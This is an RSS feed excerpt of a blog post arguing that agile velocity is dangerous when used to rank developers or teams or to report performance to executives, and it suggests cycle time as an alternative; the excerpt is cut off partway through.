<p>A related question to ask yourself is what kind of culture do I want to create? <a href="https://linearb.io/blog/our-dev-culture-is-based-on-bushido-samurai-code-my-interview-with-the-vp-of-engineering-at-gigsmart/" target="_blank" rel="noreferrer noopener">One VP of Engineering I interviewed recently</a> talked about how measuring the wrong things can backfire and hurt culture. <a href="https://linearb.io/coffee-talk/" target="_blank" rel="noreferrer noopener">Chris Downard from GigSmart</a> says</p>



<figure><blockquote><p><em>‚ÄúIf you stack rank individual devs you create anxiety.</em></p><cite>Chris Downard, VP of Engineering, Gigsmart</cite></blockquote></figure>



<p>One of the things I don‚Äôt like about getting individual statistics, like the number of commits you push as an individual developer, is that you‚Äôre incentivizing the number of commits they push. Not necessarily the quality. Or not necessarily tied to the business objective for delivery.&nbsp;</p>



<p><em>I don‚Äôt care how many commits they make. I care about the work the team gets done. For example, if a developer starts pairing [pair programming] a bunch that should not affect how we view them as long as they keep delivering value.‚Äù</em></p>



<p>He‚Äôs not the only software development leader I‚Äôve met who feels this way. Kara Minotti Becker, a respected agile consultant, told me recently</p>



<p><em>‚ÄúMembers of software development teams, including engineers, are often scared of metrics‚Ä¶ who they‚Äôre going to be exposed to.‚Äù</em></p>



<p>I‚Äôve seen this too. If you want to create an environment where it‚Äôs all about the team, consider throwing out metrics like individual code changes and commits, and just measure team-based metrics.&nbsp;</p>







<h3>2) <strong>Agile Velocity abused by Executives as a performance metric</strong></h3>



<p>It‚Äôs no secret‚Ä¶ executives love data. Especially performance related metrics.</p>



<p>One of the biggest issues that we face as software development leaders is the lack of standardized metrics describing the health and performance of our teams. Unlike all other major departments (sales, marketing, finance), we as a community lack the basics when it comes to data-driven team performance.&nbsp;</p>



<p>Sales has revenue and pipeline and sales cycle length&nbsp;</p>



<p>Marketing has MQLs and SQLs and cost of customer acquisition&nbsp;</p>



<p>HR has positive and negative employee engagement and retention rates&nbsp;</p>



<p>CEOs and business leaders get these metrics. They know what good and bad looks like. They know the leading indicators for success. They know what levers they can pull when those department leaders need help.&nbsp;</p>



<p>Engineering is often reduced to, <a href="https://linearb.io/blog/two-data-points-the-vp-of-engineering-should-show-the-ceo-every-week/" target="_blank" rel="noreferrer noopener">‚Äúare we on track to deliver XYZ feature by the deadline?‚Äù</a></p>



<p>Their intentions are good and they want to understand, but most CEOs don‚Äôt have an engineering background and therefore they don‚Äôt have tools they need to understand engineering in the same way.&nbsp;</p>



<p>Then all of sudden your CEO catches wind that there is a metric called Velocity that your agile software development teams are tracking.&nbsp;</p>



<p>You say‚Ä¶ <em>‚ÄúEach team uses it to estimate how much work they can get done in a sprint.‚Äù</em></p>



<p>They hear‚Ä¶ ‚ÄúWe can use it to measure dev org output over time and rank team performance.‚Äù&nbsp;</p>



<p>They say‚Ä¶&nbsp; ‚ÄúLet‚Äôs start presenting velocity in every executive meeting and at every all-hands!‚Äù</p>



<p>What you should think‚Ä¶ ‚ÄúIt‚Äôs a trap!‚Äù&nbsp;</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg" alt="Using agile velocity as a metric is a trap">
</picture>
</figure>



<h4><strong>What can go wrong</strong></h4>



<p>At this point in the conversation, our spidey senses should be going crazy. Velocity at the executive table? Do not proceed.&nbsp;</p>



<h5><strong>Tips to navigate this situation</strong></h5>



<p>This is our time to gracefully push back.&nbsp;</p>



<ul><li>Ask questions to understand what exactly your executive team is looking for. Is it team performance data? Are they worried about deadline predictability? Are they wondering about the impact of the new hires they invested in?<br></li><li>Start with yes. ‚ÄúWe can absolutely be data-driven.‚Äù<br>(I had a boss that told me ‚Äústart with yes‚Äù, then get to the outcome you want. That concept has served me well over the years ‚Äì especially with CEOs üôÇ )<br></li><li>You know that it will damage culture and encourage sandbagging. But consider keeping all of that to yourself and just explain why Agile Velocity is not accurate when used for anything other than individual team sprint capacity planning. A<br></li><li>Come with an alternative. <a rel="noreferrer noopener" href="https://linearb.io/cycle-time/" target="_blank">Cycle time</a> is a great one because execs already understand sales cycle time. Software development cycle time is the equivalent for engineering teams.&nbsp;</li></ul>







<h3><strong>3) Agile Velocity as a false predictor of project delivery date</strong></h3>



<p>We‚Äôve gone through two of the basic traps. Don‚Äôt use velocity as a performance metric at the executive table and don‚Äôt use velocity as a team comparison metric.&nbsp;</p>



<p>Now things get more interesting‚Ä¶&nbsp;</p>



<p>The scene looks like this: A project manager wants to estimate when a project is going to be delivered. ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</a></em></p>]]>
            </description>
            <link>https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574765</guid>
            <pubDate>Thu, 24 Sep 2020 02:44:38 GMT</pubDate>
        </item>
    </channel>
</rss>
